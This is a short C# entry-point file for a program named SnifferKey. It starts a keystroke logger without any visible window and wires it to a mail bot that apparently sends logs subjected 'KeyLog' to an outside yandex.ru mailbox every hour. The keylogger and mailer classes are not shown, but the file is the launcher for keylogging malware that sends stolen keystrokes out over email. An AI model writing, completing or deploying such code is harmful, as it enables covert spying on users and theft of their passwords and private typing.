using System;
using System.Windows.Forms;

namespace SnifferKey
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            MailBot mailBot = new MailBot("empty.keysniffer", 
                "pass", "empty.keysniffer@yandex.ru",
                new string[1] { "mail" },
                string.Format("KeyLog - {0}", DateTime.Now));

            KeySniffer keySniffer = new KeySniffer(mailBot, 8);
            keySniffer.Start(3600);
                
            Application.Run();
        }
    }
}
